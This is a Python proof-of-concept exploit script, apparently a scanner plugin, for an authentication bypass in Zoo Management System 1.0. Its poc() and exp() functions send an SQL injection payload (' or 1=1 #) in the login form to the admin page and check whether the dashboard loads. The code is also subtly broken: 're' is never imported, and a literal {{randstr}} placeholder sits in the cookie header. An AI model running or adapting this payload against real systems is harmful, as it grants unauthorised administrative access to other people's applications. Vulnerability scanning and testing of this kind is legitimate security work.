import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Zoo Management System 1.0 - Authentication Bypass''',
        "description": '''A vulnerability in Zoo Management allows remote attackers to bypass the authentication mechanism via an SQL injection vulnerability.''',
        "severity": "high",
        "references": [
            "https://www.exploit-db.com/exploits/48880"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["auth-bypass", "zms"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/zms/admin/index.php"""
        method = "POST"
        data = """username=dw1%27+or+1%3D1+%23&password=dw1%27+or+1%3D1+%23&login="""
        headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Content-Type': 'application/x-www-form-urlencoded', 'Cookie': 'PHPSESSID={{randstr}}'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (re.search(r"""Zoo Management System (\|\| Dashboard|@ 2020\. All right reserved)""",resp0.text) and re.search(r"""ZMS ADMIN""",resp0.text)) and (resp0.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url